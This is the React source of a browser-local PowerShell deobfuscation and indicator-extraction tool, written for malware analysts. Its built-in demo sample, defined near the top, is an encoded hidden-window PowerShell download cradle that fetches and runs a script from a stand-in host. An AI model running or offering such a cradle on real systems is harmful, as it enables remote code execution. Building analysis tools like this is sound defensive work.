// Husk — PowerShell deobfuscation and IOC extraction, fully browser-local.
// SPDX-License-Identifier: PolyForm-Small-Business-1.0.0
// Required Notice: Copyright 2026 Mo4n6 (https://github.com/Mo4n6/tools)
//
import { useCallback, useMemo, useState } from 'react';

import { HUSK_AUTHOR, HUSK_AUTHOR_URL, HUSK_COPYRIGHT, HUSK_SOURCE_URL } from './attribution';
import type { GapRecord } from './core/gaps';
import type { EventOrigin } from './core/trace';
import { isEngineResult } from './engine/analyze';
import type { SuppliedDownload as SuppliedStage } from './engine/engine.worker';
import type { Ioc, IocKind } from './ioc/types';
import { useHusk } from './useHusk';

const panel =
  'rounded-md border border-emerald-500/30 bg-[#07110a] p-3 text-sm text-emerald-100';
const primaryAction =
  'rounded-md border border-emerald-400 bg-emerald-500/15 px-3 py-2 text-sm text-emerald-100 hover:border-emerald-300 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 disabled:opacity-40';
const secondaryAction =
  'rounded-md border border-emerald-500/40 bg-[#07110a] px-3 py-2 text-sm text-emerald-100 hover:border-emerald-300/70 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 disabled:opacity-40';

/**
 * The result panels, as tabs.
 *
 * Stacked, these ran to several screens and the thing an analyst wanted was
 * usually the one below the fold. 'output' is always present and always first:
 * it is the question the sample answers.
 */
type TabId = 'output' | 'indicators' | 'calls' | 'layers' | 'files' | 'registry' | 'fidelity';

const IOC_LABELS: Record<IocKind, string> = {
  url: 'URLs',
  ipv4: 'IP addresses',
  domain: 'Domains',
  email: 'Email addresses',
  filepath: 'File paths',
  registry: 'Registry keys',
  'scheduled-task': 'Scheduled tasks',
  mutex: 'Mutexes',
  hash: 'Hashes',
  'base64-blob': 'Base64 blobs',
  pe: 'Embedded PE',
};

const GAP_LABELS: Record<GapRecord['kind'], { label: string; tone: string }> = {
  GAP: { label: 'Unimplemented', tone: 'text-amber-300 border-amber-500/40' },
  STUB_BY_DESIGN: { label: 'Stubbed by design', tone: 'text-emerald-300 border-emerald-500/40' },
  HARD_BLOCK: { label: 'Cannot be resolved', tone: 'text-rose-300 border-rose-500/40' },
};

const SAMPLE = String.raw`powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGkAbgB2AGEAbABpAGQALwBhAC4AcABzADEAJwApAA==`;

const HuskApp = (): JSX.Element => {
  const [source, setSource] = useState('');
  const [copied, setCopied] = useState<string | null>(null);
  const { state, engine, run, readDropped, reset } = useHusk();
  const [useEngine, setUseEngine] = useState(false);
  const [saving, setSaving] = useState<string | null>(null);
  const [stages, setStages] = useState<SuppliedStage[]>([]);
  const [tab, setTab] = useState<TabId>('output');

  const result = state.result;
  const engineResult = result !== undefined && isEngineResult(result) ? result : undefined;
  // Only offered when a published engine actually answered the probe. An
  // engine the UI offers and cannot load is worse than no offer.
  const engineAvailable = engine?.available === true;

  const handleRun = useCallback(() => {
    const onEngine = useEngine && engineAvailable;
    run(source, undefined, onEngine ? 'engine' : 'tree-walker', {
      downloads: stages.filter((stage) => stage.key.trim().length > 0),
      networkMode: 'blocked',
    });
  }, [engineAvailable, run, source, stages, useEngine]);

  const handleClear = useCallback(() => {
    setSource('');
    reset();
  }, [reset]);

  const copy = useCallback((label: string, text: string) => {
    void navigator.clipboard?.writeText(text).then(
      () => {
        setCopied(label);
        window.setTimeout(() => setCopied(null), 1500);
      },
      () => setCopied(null),
    );
  }, []);

  const iocGroups = useMemo(() => {
    if (!result) return [];
    return [...result.iocs.byKind.entries()].sort((a, b) => a[0].localeCompare(b[0]));
  }, [result]);

  const defangedList = useMemo(
    () => result?.iocs.indicators.map((i) => `${i.kind}\t${i.defanged}`).join('\n') ?? '',
    [result],
  );

  const gapIssue = useMemo(() => buildIssueText(result?.gaps ?? []), [result]);

  /**
   * One tab per thing the result has, and none for what it does not.
   *
   * Counts live in the tab rather than only inside the panel: "Files 3" tells
   * an analyst there is something to look at without opening it, which is the
   * whole reason to put these behind tabs instead of stacking them.
   */
  const tabs: readonly { id: TabId; label: string; count?: number }[] =
    result === undefined
      ? []
      : [
          { id: 'output' as TabId, label: engineResult ? 'Output' : 'Deobfuscated' },
          ...(iocGroups.length > 0
            ? [
                {
                  id: 'indicators' as TabId,
                  label: 'Indicators',
                  count: result.iocs.indicators.length,
                },
              ]
            : []),
          ...(result.events.length > 0
            ? [{ id: 'calls' as TabId, label: 'Calls', count: result.events.length }]
            : []),
          ...(result.layers.length > 0
            ? [{ id: 'layers' as TabId, label: 'Layers', count: result.layers.length }]
            : []),
          ...(engineResult !== undefined && engineResult.dropped.length > 0
            ? [{ id: 'files' as TabId, label: 'Files', count: engineResult.dropped.length }]
            : []),
          ...(engineResult !== undefined && engineResult.registryWrites.length > 0
            ? [
                {
                  id: 'registry' as TabId,
                  label: 'Registry',
                  count: engineResult.registryWrites.length,
                },
              ]
            : []),
          { id: 'fidelity' as TabId, label: 'Fidelity', count: result.gaps.length },
        ];

  // Resolved rather than stored, so a result without the selected tab falls
  // back instead of rendering an empty panel. Keeping it in state alone needed
  // an effect to correct it, which shows the empty panel for one frame first.
  const active: TabId = tabs.some((entry) => entry.id === tab) ? tab : (tabs[0]?.id ?? 'output');

  /**
   * Hands a dropped file to the analyst, with `.malware` on the end.
   *
   * The suffix is not decoration. This is a real payload leaving the sandbox
   * for the analyst's own disk, and it should land somewhere no shell, handler
   * or preview will open by double-click.
   */
  const saveDropped = useCallback(
    async (enginePath: string, windowsPath: string) => {
      setSaving(enginePath);
      try {
        const bytes = await readDropped(enginePath);
        const name = `${windowsPath.split(/[\\/]/).pop() ?? 'dropped'}.malware`;
        const url = URL.createObjectURL(new Blob([bytes], { type: 'application/octet-stream' }));
        const anchor = document.createElement('a');
        anchor.href = url;
        anchor.download = name;
        anchor.click();
        URL.revokeObjectURL(url);
      } finally {
        setSaving(null);
      }
    },
    [readDropped],
  );

  return (
    <div className="flex w-full flex-col p-2 font-mono text-emerald-100 md:p-4">
      <header className="mb-4">
        <h1 className="text-3xl font-bold">Husk</h1>
        <p className="mt-2 max-w-3xl text-sm text-emerald-300/70">
          Paste obfuscated PowerShell. Husk emulates it rather than running it: the computational
          half of the language is evaluated for real, every dangerous construct is recorded instead
          of performed, and each <code>IEX</code> becomes a layer you can read. Analysis happens in
          this tab and makes no network requests.
        </p>
      </header>

      <div className="grid gap-4 lg:grid-cols-2">
        <section className="flex flex-col gap-2">
          <label className="text-xs uppercase tracking-wide text-emerald-300/60" htmlFor="husk-input">
            Sample
          </label>
          <textarea
            id="husk-input"
            className="h-64 w-full resize-y rounded-md border border-emerald-500/30 bg-[#07110a] p-3 text-xs text-emerald-100 focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400"
            spellCheck={false}
            placeholder="Paste a PowerShell sample…"
            value={source}
            onChange={(event) => setSource(event.target.value)}
          />
          <div className="flex flex-wrap gap-2">
            <button className={primaryAction} onClick={handleRun} disabled={state.status === 'running'}>
              {state.status === 'running' ? 'Analysing…' : 'Analyse'}
            </button>
            <button className={secondaryAction} onClick={handleClear}>
              Clear
            </button>
            <button className={secondaryAction} onClick={() => setSource(SAMPLE)}>
              Load example
            </button>
          </div>

          {engineAvailable ? (
            <label className="flex items-start gap-2 text-xs text-emerald-300/70">
              <input
                type="checkbox"
                className="mt-0.5"
                checked={useEngine}
                onChange={(event) => setUseEngine(event.target.checked)}
              />
              <span>
                Run it on real PowerShell, in this tab. Sees what the sample actually did — the
                files it dropped, the registry it wrote — rather than what its source says. Costs a
                one-off 13 MB download, and cannot work from a <code>file://</code> copy.
              </span>
            </label>
          ) : null}

          {engineAvailable && useEngine ? (
            <StagePanel stages={stages} setStages={setStages} />
          ) : null}

          {state.status === 'error' ? (
            <p className={`${panel} border-rose-500/40 text-rose-200`}>{state.error}</p>
          ) : null}
        </section>

        <section className="flex flex-col gap-3">
          {!result ? (
            <div className={`${panel} text-emerald-300/60`}>
              Results appear here. Nothing is sent anywhere.
            </div>
          ) : (
            <>
              <div className={panel}>
                <div className="flex flex-wrap items-center justify-between gap-2">
                  <span className="text-xs uppercase tracking-wide text-emerald-300/60">
                    {state.backend === 'engine' ? 'real PowerShell · ' : null}
                    {result.layers.length} layer{result.layers.length === 1 ? '' : 's'} ·{' '}
                    {result.iocs.indicators.length} indicator
                    {result.iocs.indicators.length === 1 ? '' : 's'} · {result.elapsedMs}ms
                  </span>
                  <span
                    className={`rounded border px-2 py-0.5 text-xs ${
                      result.reliable
                        ? 'border-emerald-500/40 text-emerald-300'
                        : 'border-amber-500/40 text-amber-300'
                    }`}
                  >
                    {result.reliable ? 'Fully resolved' : 'Incomplete — see fidelity'}
                  </span>
                </div>
                {result.iocs.truncatedKinds.length > 0 ? (
                  <p className="mt-2 text-xs text-amber-300">
                    Too many matches to list for:{' '}
                    {result.iocs.truncatedKinds.join(', ')}. The indicator list is incomplete.
                  </p>
                ) : null}
                {result.iocs.hasEmbeddedPe ? (
                  <p className="mt-2 text-xs text-rose-300">
                    An embedded PE (MZ header) was found in a decoded blob.
                  </p>
                ) : null}
              </div>

              {engineResult?.stoppedBy !== undefined ? (
                <p className={`${panel} border-amber-500/40 text-amber-200`}>
                  The run was cut short: {engineResult.stoppedBy}. Everything below is still
                  evidence — the sample may simply have had more to do.
                </p>
              ) : null}

              <TabBar tabs={tabs} active={active} onPick={setTab} />

              <div
                role="tabpanel"
                id={`husk-panel-${active}`}
                aria-labelledby={`husk-tab-${active}`}
                className="flex flex-col gap-3"
              >
              {active === 'output' ? (
                <OutputPanel
                  text={result.output}
                  isEngine={engineResult !== undefined}
                  error={engineResult?.engineError}
                  completed={engineResult?.completed ?? true}
                  copied={copied === 'output'}
                  onCopy={() => copy('output', result.output)}
                />
              ) : null}

              {active === 'files' && engineResult !== undefined && engineResult.dropped.length > 0 ? (
                <div className={panel}>
                  <h2 className="mb-2 text-sm font-bold">Files the sample wrote</h2>
                  <p className="mb-2 text-xs text-emerald-300/60">
                    Written to an in-memory filesystem, never to your disk. Saving one puts a real
                    payload on it, so the name gets a <code>.malware</code> suffix.
                  </p>
                  <ul className="flex flex-col gap-2 text-xs">
                    {engineResult.dropped.map((file) => (
                      <li key={file.enginePath} className="flex flex-wrap items-baseline gap-2">
                        <span className="break-all text-emerald-200">{file.path}</span>
                        <span className="text-emerald-300/60">{file.size} bytes</span>
                        <span className="break-all text-emerald-300/40">
                          {file.sha256.slice(0, 16)}…
                        </span>
                        <button
                          className="text-emerald-300/70 underline hover:text-emerald-200"
                          disabled={saving === file.enginePath}
                          onClick={() => void saveDropped(file.enginePath, file.path)}
                        >
                          {saving === file.enginePath ? 'Saving…' : 'Save'}
                        </button>
                      </li>
                    ))}
                  </ul>
                </div>
              ) : null}

              {active === 'registry' &&
              engineResult !== undefined &&
              engineResult.registryWrites.length > 0 ? (
                <div className={panel}>
                  <h2 className="mb-2 text-sm font-bold">Registry the sample wrote</h2>
                  <p className="mb-2 text-xs text-emerald-300/60">
                    A virtual registry, so nothing reached a real one. Values Husk seeded for the
                    sample to read are not listed.
                  </p>
                  <ul className="flex flex-col gap-1 text-xs">
                    {engineResult.registryWrites.map((write) => (
                      <li key={`${write.key}-${write.name}`} className="break-all">
                        <span className="text-emerald-300/60">{write.key}</span>{' '}
                        <span className="text-emerald-200">{write.name}</span>{' '}
                        <span className="text-emerald-100/70">= {write.value}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              ) : null}

              {active === 'indicators' && iocGroups.length > 0 ? (
                <div className={panel}>
                  <div className="mb-2 flex items-center justify-between gap-2">
                    <h2 className="text-sm font-bold">Indicators</h2>
                    <button
                      className="text-xs text-emerald-300/70 underline hover:text-emerald-200"
                      onClick={() => copy('iocs', defangedList)}
                    >
                      {copied === 'iocs' ? 'Copied' : 'Copy defanged'}
                    </button>
                  </div>
                  <div className="flex flex-col gap-3">
                    {iocGroups.map(([kind, list]) => (
                      <IocGroup key={kind} kind={kind} list={list} />
                    ))}
                  </div>
                </div>
              ) : null}

              {active === 'calls' && result.events.length > 0 ? (
                <div className={panel}>
                  <h2 className="mb-2 text-sm font-bold">Recorded calls</h2>
                  <p className="mb-2 text-xs text-emerald-300/60">
                    Recognised and logged, never performed. Hover a row&rsquo;s source to see how
                    far it can be trusted.
                  </p>
                  <ul className="flex flex-col gap-1 text-xs">
                    {result.events.map((event, index) => (
                      <li key={`${event.signature}-${index}`} className="break-all">
                        <span
                          className="text-emerald-300/40"
                          title={originNote(event.origin)}
                        >
                          {event.origin ?? 'text-scan'}
                        </span>{' '}
                        <span className="text-emerald-300/60">[{event.category}]</span>{' '}
                        <span className="text-emerald-200">{event.signature}</span>{' '}
                        <span className="text-emerald-100/70">{event.args.join(' , ')}</span>
                      </li>
                    ))}
                  </ul>
                </div>
              ) : null}

              {active === 'layers' ? (
              <div className={panel}>
                <h2 className="mb-2 text-sm font-bold">Layers</h2>
                <div className="flex flex-col gap-2">
                  {result.layers.map((layer) => (
                    <details key={layer.index} open={layer.index === result.layers.length - 1}>
                      <summary className="cursor-pointer text-xs text-emerald-300/70">
                        Layer {layer.index}
                        {layer.origin.via === 'input'
                          ? ' · pasted input'
                          : layer.origin.via === 'decode'
                            ? ` · ${layer.origin.transform}`
                            : ` · ${layer.origin.operator}`}
                      </summary>
                      <pre className="mt-1 max-h-64 overflow-auto whitespace-pre-wrap break-all rounded border border-emerald-500/20 bg-black/30 p-2 text-xs">
                        {layer.source}
                      </pre>
                    </details>
                  ))}
                </div>
              </div>
              ) : null}

              {active === 'fidelity' ? (
                <FidelityPanel
                  gaps={result.gaps}
                  copied={copied === 'gaps'}
                  onCopy={() => copy('gaps', gapIssue)}
                />
              ) : null}
              </div>
            </>
          )}
        </section>
      </div>

      <footer className="mt-6 border-t border-emerald-500/20 pt-3 text-xs text-emerald-300/50">
        <span>{HUSK_COPYRIGHT}</span>
        <span aria-hidden="true"> · </span>
        <a
          className="underline hover:text-emerald-200"
          href={HUSK_AUTHOR_URL}
          target="_blank"
          rel="noreferrer noopener"
        >
          @{HUSK_AUTHOR}
        </a>
        <span aria-hidden="true"> · </span>
        <a
          className="underline hover:text-emerald-200"
          href={HUSK_SOURCE_URL}
          target="_blank"
          rel="noreferrer noopener"
        >
          source
        </a>
        <span aria-hidden="true"> · </span>
        <span>
          Lexer tables ported from PowerShell (MIT), Copyright (c) Microsoft Corporation.
        </span>
      </footer>
    </div>
  );
};

const IocGroup = ({ kind, list }: { kind: IocKind; list: readonly Ioc[] }): JSX.Element => (
  <div>
    <h3 className="text-xs uppercase tracking-wide text-emerald-300/60">
      {IOC_LABELS[kind] ?? kind} ({list.length})
    </h3>
    <ul className="mt-1 flex flex-col gap-1 text-xs">
      {list.map((ioc) => (
        <li key={`${ioc.kind}-${ioc.value}`} className="break-all">
          <span className="text-emerald-100">{ioc.defanged}</span>
          <span className="text-emerald-300/50">
            {' '}
            · layer {ioc.layer}
            {ioc.occurrences > 1 ? ` · ×${ioc.occurrences}` : ''}
            {ioc.confidence === 'medium' ? ' · possible' : ''}
          </span>
        </li>
      ))}
    </ul>
  </div>
);

const FidelityPanel = ({
  gaps,
  copied,
  onCopy,
}: {
  gaps: readonly GapRecord[];
  copied: boolean;
  onCopy: () => void;
}): JSX.Element | null => {
  if (gaps.length === 0) return null;

  return (
    <div className={panel}>
      <div className="mb-2 flex items-center justify-between gap-2">
        <h2 className="text-sm font-bold">Fidelity</h2>
        <button className="text-xs text-emerald-300/70 underline hover:text-emerald-200" onClick={onCopy}>
          {copied ? 'Copied' : 'Copy as issue'}
        </button>
      </div>
      <p className="mb-2 text-xs text-emerald-300/60">
        What Husk could not resolve, ranked by how far it spread.
      </p>
      <ul className="flex flex-col gap-1 text-xs">
        {gaps.slice(0, 24).map((gap) => (
          <li key={gap.id} className="break-all">
            <span className={`mr-2 rounded border px-1 ${GAP_LABELS[gap.kind].tone}`}>
              {GAP_LABELS[gap.kind].label}
            </span>
            <span className="text-emerald-100">{gap.signature}</span>
            <span className="text-emerald-300/50">
              {' '}
              · layer {gap.provenance.layer}
              {gap.blastRadius > 0 ? ` · reached ${gap.blastRadius} value${gap.blastRadius === 1 ? '' : 's'}` : ''}
              {gap.reachedOutput ? ' · affects output' : ''}
            </span>
          </li>
        ))}
      </ul>
    </div>
  );
};

/**
 * A ready-to-file issue body. Only signatures and positions - argument values
 * can contain payload, which is fine locally and not fine in a public issue.
 */
/**
 * What a row's source means for trusting it.
 *
 * Two of these are not like the others. A `text-scan` row was never executed —
 * it is a pattern in the source, and the call may never have happened. A
 * `proxy` row was executed, but through a Husk stand-in that a sample can
 * reach and therefore fake. The rest are chokepoints a sample cannot route
 * around, and they differ only in what they can see.
 */
function originNote(origin: EventOrigin | undefined): string {
  switch (origin) {
    case 'binder':
      return 'Observed: a .NET method call made from the script.';
    case 'cmdlet':
      return 'Observed: a cmdlet invocation, with its parameters as the sample wrote them.';
    case 'provider':
      return 'Observed: the write as it actually happened, with the path resolved.';
    case 'proxy':
      return 'Observed by a Husk stand-in. Script-reachable, so a sample could have forged it.';
    default:
      return 'Inferred from the source text. This call may never have run.';
  }
}

function buildIssueText(gaps: readonly GapRecord[]): string {
  const actionable = gaps.filter((g) => g.kind === 'GAP');
  if (actionable.length === 0) return 'No unimplemented constructs.';

  const lines = [
    '### Husk: unimplemented constructs',
    '',
    '| Signature | Layer | Blast radius | Affects output |',
    '| --- | --- | --- | --- |',
    ...actionable.map(
      (g) =>
        `| \`${g.signature}\` | ${g.provenance.layer} | ${g.blastRadius} | ${g.reachedOutput ? 'yes' : 'no'} |`,
    ),
    '',
    '_Argument values omitted: they may contain payload._',
  ];
  return lines.join('\n');
}

/**
 * Stages the analyst hands over, so a downloader can be followed.
 *
 * This exists because of a hard limit, not a missing feature: a browser can
 * only read a cross-origin response when the server sends CORS headers, and
 * C2 infrastructure does not, so fetching stage 2 automatically is refused by
 * the browser before Husk sees it. Supplying the body is how the chain gets
 * followed - the stage then executes for real, and everything it does is
 * captured the same way the first stage was.
 */
const StagePanel = ({
  stages,
  setStages,
}: {
  stages: SuppliedStage[];
  setStages: (next: SuppliedStage[]) => void;
}): JSX.Element => {
  const update = (at: number, patch: Partial<SuppliedStage>): void =>
    setStages(stages.map((stage, i) => (i === at ? { ...stage, ...patch } : stage)));

  const addFiles = async (files: FileList | null): Promise<void> => {
    if (files === null) return;
    const added: SuppliedStage[] = [];
    for (const file of Array.from(files)) {
      // Bytes, not text: the file may be the payload rather than a script,
      // and decoding it would corrupt what the analyst then saves.
      added.push({ key: file.name, content: new Uint8Array(await file.arrayBuffer()) });
    }
    setStages([...stages, ...added]);
  };

  return (
    <div className={`${panel} flex flex-col gap-3 text-xs text-emerald-300/70`}>
      <p>
        <span className="text-emerald-200">Stages to serve.</span> A downloader stops at the
        download: a browser cannot read a response from a server that sends no CORS headers, and
        malware servers send none. Give Husk the body and the chain runs for real — every IOC in
        stage 2 and beyond is captured, and what it writes to disk is saveable.
      </p>

      {stages.length > 0 ? (
        <ul className="flex flex-col gap-2">
          {stages.map((stage, at) => (
            <li key={at} className="flex flex-col gap-1 border-l border-emerald-500/20 pl-2">
              <div className="flex items-center gap-2">
                <input
                  className="min-w-0 flex-1 bg-black/30 px-2 py-1 font-mono text-emerald-200"
                  placeholder="stage2.ps1, or the whole URL, or * for anything"
                  value={stage.key}
                  onChange={(event) => update(at, { key: event.target.value })}
                />
                <button
                  className="text-emerald-300/70 underline hover:text-emerald-200"
                  onClick={() => setStages(stages.filter((_, i) => i !== at))}
                >
                  Remove
                </button>
              </div>
              {typeof stage.content === 'string' ? (
                <textarea
                  className="h-20 w-full resize-y bg-black/30 px-2 py-1 font-mono text-emerald-200"
                  placeholder="What the server would have returned."
                  value={stage.content}
                  onChange={(event) => update(at, { content: event.target.value })}
                />
              ) : (
                <span className="text-emerald-300/50">
                  {stage.content.length.toLocaleString()} bytes from a file, served as-is
                </span>
              )}
            </li>
          ))}
        </ul>
      ) : null}

      <div className="flex flex-wrap items-center gap-3">
        <button
          className="text-emerald-300/70 underline hover:text-emerald-200"
          onClick={() => setStages([...stages, { key: '', content: '' }])}
        >
          Add a stage
        </button>
        <label className="cursor-pointer text-emerald-300/70 underline hover:text-emerald-200">
          <input
            type="file"
            multiple
            className="hidden"
            onChange={(event) => void addFiles(event.target.files)}
          />
          Add from files
        </label>
      </div>

      <p className="border-t border-emerald-500/20 pt-2 text-emerald-300/50">
        There is no option to fetch an unmatched URL. A download has to be synchronous for a
        PowerShell proxy to return it, and a synchronous request made from inside the engine kills
        the worker it runs in — measured, with a control run that leaves the engine alive when
        nothing is downloaded. It would mostly have been refused by the browser anyway, for want of
        CORS headers on the far end.
      </p>
    </div>
  );
};

const TabBar = ({
  tabs,
  active,
  onPick,
}: {
  tabs: readonly { id: TabId; label: string; count?: number }[];
  active: TabId;
  onPick: (id: TabId) => void;
}): JSX.Element => (
  <div
    role="tablist"
    aria-label="Analysis panels"
    className="flex flex-wrap gap-1 border-b border-emerald-500/20"
  >
    {tabs.map((entry) => {
      const selected = entry.id === active;
      return (
        <button
          key={entry.id}
          role="tab"
          id={`husk-tab-${entry.id}`}
          aria-selected={selected}
          aria-controls={`husk-panel-${entry.id}`}
          // -mb-px so the active tab's underline sits on the container's
          // border rather than below it, which otherwise reads as a gap.
          className={`-mb-px rounded-t-md border-b-2 px-3 py-1.5 text-xs uppercase tracking-wide transition-colors focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-emerald-400 ${
            selected
              ? 'border-emerald-400 bg-emerald-500/10 text-emerald-100'
              : 'border-transparent text-emerald-300/60 hover:border-emerald-500/40 hover:text-emerald-200'
          }`}
          onClick={() => onPick(entry.id)}
        >
          {entry.label}
          {entry.count !== undefined ? (
            <span className={`ml-1.5 ${selected ? 'text-emerald-300/70' : 'text-emerald-300/40'}`}>
              {entry.count}
            </span>
          ) : null}
        </button>
      );
    })}
  </div>
);

/**
 * What the run produced, which is a different thing for each backend.
 *
 * The engine reports behaviour: this is what the sample printed. The
 * tree-walker does not execute at all, so its output is the source with every
 * layer resolved. Labelling both "output" would be the kind of quiet wrongness
 * that costs an analyst an hour - a sample that prints nothing can still drop a
 * file and persist, and that is not the same claim as "no output, nothing
 * happened".
 */
const OutputPanel = ({
  text,
  isEngine,
  error,
  completed,
  copied,
  onCopy,
}: {
  text: string;
  isEngine: boolean;
  error?: string;
  completed: boolean;
  copied: boolean;
  onCopy: () => void;
}): JSX.Element => (
  <div className={panel}>
    <div className="mb-2 flex items-center justify-between gap-2">
      <h2 className="text-sm font-bold">{isEngine ? 'Output' : 'Deobfuscated source'}</h2>
      <button
        className="text-xs text-emerald-300/70 underline hover:text-emerald-200"
        onClick={onCopy}
      >
        {copied ? 'Copied' : 'Copy'}
      </button>
    </div>
    <p className="mb-2 text-xs text-emerald-300/60">
      {isEngine
        ? 'What the sample printed as it ran — not its deobfuscated source. A sample that prints nothing can still drop a file and persist; the other tabs are where that shows.'
        : 'The source with every layer resolved. The tree-walker reads rather than runs, so there is no runtime output to show — switch on the engine for that.'}
    </p>
    <pre className="max-h-96 overflow-auto whitespace-pre-wrap break-all rounded border border-emerald-500/20 bg-black/40 p-3 font-mono text-xs leading-relaxed">
      {text.length > 0 ? text : isEngine ? '(the sample printed nothing)' : '(nothing resolved)'}
    </pre>
    {error !== undefined && error.length > 0 ? (
      <p className="mt-2 text-xs text-rose-300">
        First error the sample raised: {error}
      </p>
    ) : null}
    {isEngine && !completed ? (
      <p className="mt-2 text-xs text-amber-300">
        The pipeline did not run to the end, so the sample may have had more to do.
      </p>
    ) : null}
  </div>
);

export default HuskApp;
